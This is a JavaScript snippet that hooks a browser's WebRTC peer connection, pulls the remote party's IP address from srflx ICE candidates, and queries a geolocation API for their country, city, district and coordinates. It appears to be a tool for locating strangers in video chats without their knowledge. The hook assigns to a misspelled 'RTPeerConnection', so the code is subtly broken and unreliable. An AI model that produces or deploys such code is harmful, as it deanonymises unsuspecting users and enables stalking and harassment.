const access_token = "your-access-token";

window.oRTCPeerConnection =
  window.oRTCPeerConnection || window.RTCPeerConnection;
window.RTPeerConnection = function (...args) {
  const pc = new window.oRTCPeerConnection(...args);
  pc.oaddIceCandidate = pc.addIceCandidate;
  pc.addIceCandidate = function (iceCandidate, ...rest) {
    const fields = iceCandidate.candidate.split(" ");
    const ip = fields[4];
    if (fields[7] === "srflx") {
      getLocation(ip);
    }
    return pc.oaddIceCandidate(iceCandidate, rest);
  };
  return pc;
};

const getLocation = async (ip) => {
  let url = `https://graph.facebook.com/v13.0/ipgeo?fields=country,region,city,district,latitude,longitude&access_token=${access_token}&ip=${ip}`;
  await fetch(url).then((response) =>
    response.json().then((json) => {
      const output = {
        Country: json.country,
        State: json.region,
        City: json.city,
        District: json.district,
        "Lat / Long": `${json.latitude}, ${json.longitude}`,
      };
      console.log(output);
    })
  );
};